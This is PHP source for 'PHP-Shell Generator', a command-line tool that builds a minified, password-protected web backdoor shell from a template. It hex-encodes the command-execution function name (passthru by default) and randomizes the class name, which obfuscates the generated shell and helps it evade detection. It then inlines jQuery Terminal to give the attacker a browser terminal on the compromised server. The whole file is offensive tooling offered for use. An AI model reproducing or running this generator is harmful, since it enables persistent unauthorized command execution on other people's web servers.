<?php
// phpcs:ignore error

/**
 * Prints the program header.
 * @return void
 */
function _header()
{
    printf("PHP-Shell Generator\n");
    printf("http://cixtor.com/phpshell\n");
    printf("https://github.com/cixtor/phpshellgen\n");
    printf("https://en.wikipedia.org/wiki/Backdoor_Shell\n");
    printf("\n");
}

/**
 * Prints the program usage.
 * @return void
 */
function _usage()
{
    _header();
    printf("Options:\n");
    printf("  -h  Prints this message with a list of available options\n");
    printf("  -i  Specifies the file to serve as a template to generate the web shell (default \"template.txt\")\n");
    printf("  -o  Specifies the filename for the generated web shell (default `<random>.php`)\n");
    printf("  -s  Specifies the PHP function to execute Unix commands (default \"passthru\")\n");
    printf("  -u  Specifies the username to restrict access to a limit set of users\n");
    printf("  -p  Specifies the password to restrict access to a limit set of users\n");
    printf("  -l  Double-checks the consistency of the PHP code in generated file\n");
    printf("\n");
    printf("Commands:\n");
    printf("  set_interpreter         Sets the PHP function to execute commands, e.g. `set_interpreter shell_exec`\n");
    printf("  get_interpreter         Prints the current PHP function acting as the interpreter\n");
    printf("  interpreter             Alias for `get_interpreter`\n");
    printf("  get_disabled_functions  Prints a list of disabled PHP functions to identify which shell functions are available\n");
    printf("  disabled_functions      Alias for `get_disabled_functions`\n");
    printf("  get_php_version         Prints the PHP version\n");
    printf("  php_version             Alias for `get_php_version`\n");
    printf("  cd                      Changes directories using `chdir`, e.g. `cd /var/log/`\n");
    printf("  logout                  Terminates the user session and reloads the page\n");
    printf("  exit                    Alias for `logout`\n");
    printf("  status                  Prints the web shell configuration\n");
    printf("  clear                   Resets the screen\n");
    printf("\n");
    printf("Usage:\n");
    printf("  phpshellgen\n");
    printf("  phpshellgen -o /output/here/shell.php\n");
    printf("  phpshellgen -i /path/to/template.php\n");
    printf("  phpshellgen -s shell_exec\n");
    printf("  phpshellgen -u USERNAME -p PASSWORD\n");
    exit(2);
}

/**
 * Returns a random string of characters with length L.
 * @param  int|integer $n            How many characters to return.
 * @param  bool        $specialChars How many characters to return.
 * @return string                    Random string of characters.
 */
function randomString(int $n = 0, bool $specialChars = false) : string
{
    $p = "";
    $s = [
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
        'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B',
        'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
        'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3',
        '4', '5', '6', '7', '8', '9',
    ];

    if ($specialChars) {
        $s = array_merge($s, ['@', '#', '$', '%', '&', '-', '_', '+', '=']);
    }

    $b = openssl_random_pseudo_bytes($n);
    $t = strlen($b);
    $m = count($s);

    for ($i = 0; $i < $t; $i++) {
        $p .= $s[hexdec(bin2hex($b[$i])) % $m];
    }

    return $p;
}

/**
 * Converts a string of characters into hexadecimal.
 * @param  string $s String of characters.
 * @return string    String represented in hexadecimal.
 */
function str2hex(string $s = "") : string
{
    $h = "";
    $t = strlen($s);
    for ($i = 0; $i < $t; $i++) {
        $h .= '\x' . bin2hex($s[$i]);
    }
    return $h;
}

/**
 * Read local file, strip new lines, and return.
 * @param  string $f File path.
 * @return string    File content.
 */
function loadScript(string $f = "") : string
{
    return str_replace("\n", "", file_get_contents($f));
}

$config = [
    "input" => null,
    "output" => randomString(10) . ".php",
    "shell" => "passthru",
    "username" => "cixtor",
    "password" => randomString(20, true),
    "username_hash" => "",
    "password_hash" => "",
    "class_name" => randomString(rand(10, 30)),
    "lint" => false,
];

$opts = getopt("i:o:s:u:p:hl");

foreach ($opts as $name => $value) {
    switch ($name) {
        case "i": // input
            $config["input"] = $value;
            break;
        case "o": // output
            $config["output"] = $value;
            break;
        case "s": // shell
            $config["shell"] = $value;
            break;
        case "u": // username
            $config["username"] = $value;
            break;
        case "p": // password
            $config["password"] = $value;
            break;
        case "l": // lint
            $config["lint"] = !$value;
            break;
        case "h": // help
            _usage();
    }
}

$config["username_hash"] = password_hash($config["username"], PASSWORD_BCRYPT);
$config["password_hash"] = password_hash($config["password"], PASSWORD_BCRYPT);

if (!array_key_exists("i", $opts)) {
    $opts["i"] = "template.txt";
}

if (!file_exists($opts["i"])) {
    printf("%s does not exist\n", $opts["i"]);
    exit(1);
}

_header();
printf("-> Creating shell script: \033[0;94m%s\033[0m\n", $config["output"]);
printf("   Randomizing PHP class name: \033[0;92mclass %s{...}\033[0m\n", $config["class_name"]);

$out = "";

// Read a user-provided template or the default template, if necessary.
$lines = file($opts["i"], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

foreach ($lines as $line) {
    if (preg_match("/^\s*\/\//", $line) || preg_match("/^\s*(\/)?\*(\/)?/", $line)) {
        continue;
    } elseif (preg_match("/'username' => '',/", $line)) {
        // Change the line with the username.
        printf("   Username: \033[0;94m%s\033[0m (%s)\n", $config["username_hash"], $config["username"]);
        $out .= sprintf("'username'=>'%s',", $config["username_hash"]);
    } elseif (preg_match("/'password' => '',/", $line)) {
        // Change the line with the password.
        printf("   Password: \033[0;94m%s\033[0m (%s)\n", $config["password_hash"], $config["password"]);
        $out .= sprintf("'password'=>'%s',", $config["password_hash"]);
    } elseif (preg_match("/'interpreter' => '',/", $line)) {
        // Change the line with the shell interpreter.
        $hashed_func = str2hex($config["shell"]);
        printf("   Setting shell interpreter: \033[0;94m%s\033[0m (%s)\n", $hashed_func, $config["shell"]);
        $out .= sprintf("'interpreter'=>\"%s\",", $hashed_func);
    } elseif (preg_match("/^class Shell/", $line) || preg_match("/new Shell\(\)/", $line)) {
        // Change the line with the class name.
        $out .= str_replace("Shell", $config["class_name"], $line);
    } elseif (preg_match("/^<\?php$/", $line)) {
        // Change the line with the PHP tags.
        $out .= sprintf("<?php ");
    } elseif (strpos($line, '<script type="text/javascript" src="jquery.min.js"></script>') !== false) {
        // Insert a JavaScript dependency: jQuery.
        printf("   Adding JavaScript dependency: jQuery\n");
        $out .= sprintf("<script type='text/javascript'>%s</script>", loadScript("jquery.min.js"));
    } elseif (strpos($line, '<script type="text/javascript" src="jquery.terminal.min.js"></script>') !== false) {
        // Insert a JavaScript dependency: jQuery.Terminal.
        printf("   Adding JavaScript dependency: jQuery.Terminal\n");
        $out .= sprintf("<script type='text/javascript'>%s</script>", loadScript("jquery.terminal.min.js"));
    } elseif (strpos($line, '<link rel="stylesheet" type="text/css" href="jquery.terminal.min.css">') !== false) {
        // Insert a CSS dependency: jQuery.Terminal
        printf("   Adding CSS dependency: jQuery.Terminal\n");
        $out .= sprintf("<style type='text/css'>%s</style>", loadScript("jquery.terminal.min.css"));
    } else {
        // Minify the rest of the code.
        $line = preg_replace("/\t/", "\x20\x20\x20\x20", $line);
        $line = preg_replace("/\s{4}/", '', $line);
        $line = preg_replace("/(if|each|switch|return)\s\(/", '$1(', $line);
        $line = preg_replace("/\}\selse/", '}else', $line);
        $line = preg_replace("/\s+\|\|/", '||', $line);
        $line = preg_replace("/\|\|\s+/", '||', $line);
        $line = preg_replace("/\s+\?\s+/", '?', $line);
        $line = preg_replace("/\s+:\s+/", ':', $line);
        $line = preg_replace("/\s+&&/", '&&', $line);
        $line = preg_replace("/&&\s+/", '&&', $line);
        $line = preg_replace("/=>\s+/", '=>', $line);
        $line = preg_replace('/,\s\$/', ',$', $line);
        $line = preg_replace("/\s\.=/", '.=', $line);
        $line = preg_replace("/\s+=/", '=', $line);
        $line = preg_replace("/=\s+/", '=', $line);
        $line = preg_replace("/\s\{/", '{', $line);
        $line = preg_replace("/\s\!/", '!', $line);

        if (!empty($line)) {
            $out .= $line;
        }
    }
}

if (empty($config["output"])) {
    echo $out . "\n";
    exit(0);
}

file_put_contents($config["output"], $out . "\n", LOCK_EX);

if ($config["lint"]) {
    $results = [];
    $code = 999;
    exec(sprintf("php -l %s", $config["output"]), $results, $code);
    if ($code !== 0) {
        printf("-> Errors:");
        foreach ($results as $line) {
            printf("   \033[0;91m%s\033[0m\n", $line);
        }
        unlink($config["output"]);
        exit(1);
    }
}

printf("-> Finished\n");
